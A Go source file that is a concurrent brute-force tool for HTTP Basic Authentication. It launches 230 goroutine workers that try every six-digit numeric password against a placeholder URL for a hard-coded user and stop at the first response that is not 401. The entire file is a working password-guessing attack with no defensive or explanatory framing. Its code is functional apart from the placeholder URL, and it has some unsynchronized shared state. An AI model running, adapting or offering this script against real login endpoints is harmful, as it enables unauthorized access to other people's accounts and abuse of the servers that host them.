package main

import (
	"fmt"
	"net/http"
	"strconv"
)

func worker(id int, jobs <-chan int, results chan<- int) {
	// defer wg.Done()
	for {
		if done == false {
			select {
			case job := <-jobs:

				str := strconv.Itoa(job)
				if len(str) == 1 {
					str = "00000" + str
				} else if len(str) == 2 {
					str = "0000" + str
				} else if len(str) == 3 {
					str = "000" + str
				} else if len(str) == 4 {
					str = "00" + str
				} else if len(str) == 5 {
					str = "0" + str
				}
				fmt.Println("worker", id, "started  job", str)
				client := &http.Client{}
				req, _ := http.NewRequest("GET", "URL Here", nil)
				req.SetBasicAuth(user, str)
				resp, err := client.Do(req)
				if err == nil {
					resp.Body.Close()
					if resp.StatusCode != 401 {
						fmt.Println(job)
						fmt.Println("pass")
						errs = errs[:0]
						done = true
						return
					}
				} else {
					fmt.Println(err)
					// time.Sleep(3 * time.Second)
					results <- job
					errs = append(errs, job)
				}
				if done == false {
					fmt.Println("worker", id, "finished  job", str)
				}
			}
		} else {
			return
		}
	}
}

var errs []int
var done = false
var user = "someUser"

func main() {

	//Number of possible passwords
	jobs := make(chan int, 100000)
	results := make(chan int, 9999999)

	//Number of simultaneous workers
	for w := 1; w <= 230; w++ {
		go worker(w, jobs, results)
	}
	fmt.Println("workers done")

	//Starting password
	for passwd := 1; passwd <= 999999; passwd++ {
		if done == true {
			break
		}
		jobs <- passwd
	}
	fmt.Println("jobs done")
	if done == false {
		for a := 1; a <= 100000; a++ {
			errs = append(errs, <-results)
		}
	}

	fmt.Println("results done")
	if len(errs) > 0 {
		for i := range errs {
			jobs <- errs[i]
		}
	}
}
